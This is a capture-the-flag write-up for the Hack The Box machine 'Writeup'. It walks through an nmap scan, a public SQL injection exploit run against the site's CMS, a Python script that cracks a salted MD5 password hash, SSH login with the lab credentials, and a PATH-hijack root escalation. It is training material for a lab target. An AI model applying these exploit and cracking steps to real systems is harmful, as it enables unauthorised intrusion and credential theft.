# Writeup
>Author : Xyan1d3
>Date : 16th July 2021
>IP : 10.10.10.138
>OS : Linux
>Difficulty : Easy
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Fri Jul 16 02:17:22 2021 as: nmap -sC -sV -v -oN nmap/writeup 10.10.10.138
Nmap scan report for 10.10.10.138
Host is up (0.065s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration
We visit the website and find out a site with some ascii art.
![[Pasted image 20210716025638.png]]

We start enumerating the `robots.txt` and find out that we have a hidden directory.
![[Pasted image 20210716025821.png]]

```python
┌─[Magisk@Xyan1d3]─[10.10.14.4]─[~/htb/writeup]
└──╼ # python2 46635.py -u http://10.10.10.138/writeup/

[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```

We now create an `python` script to crack the `MD5` hash which has a salt in the begining.
The Hash format is : `MD5(salt + password)`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/writeup]
└──╼ # cat crack.py 
import hashlib
def crack_password():
    salt = "5a599ef579066807"
    wordlist = "/usr/share/wordlists/rockyou.txt"
    password = "62def4866937f08cc13bab43bb14e6f7"
    dict = open(wordlist)
    for line in dict.readlines():
        line = line.replace("\n", "").replace("\r", "")
        print(line)
        if hashlib.md5(str(salt) + line).hexdigest() == password:
            print("[+] password cracked : "+line)
            exit()
            break
    dict.close()
crack_password()
```

On running the `crack.py` we get the credential.
```python
[+] password cracked : raykayjay9
```

# Initial FootHold as jkr
We could use these credentials to SSH into the box.
|Username|Password|
|--|--|
|jkr|raykayjay9|

```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/writeup]
└──╼ # ssh jkr@10.10.10.138
The authenticity of host '10.10.10.138 (10.10.10.138)' can't be established.
ECDSA key fingerprint is SHA256:TEw8ogmentaVUz08dLoHLKmD7USL1uIqidsdoX77oy0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.138' (ECDSA) to the list of known hosts.
jkr@10.10.10.138's password: 
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 15 18:11:29 2021 from 10.10.14.11
jkr@writeup:~$ whoami
jkr
jkr@writeup:~$ id
uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
```

# Root Escalation
We run `pspy` on the box and SSH into the box at the same time and find out an odd thing that it sets the path and then runs the `run-parts`.
![[Pasted image 20210716131708.png]]

Now, We may put a `run-parts` in some PATH at the begining which would be an `bash` script in `/bin/sbin`.
![[Pasted image 20210716132251.png]]

We can now again `SSH` into the box to trigger the exploit.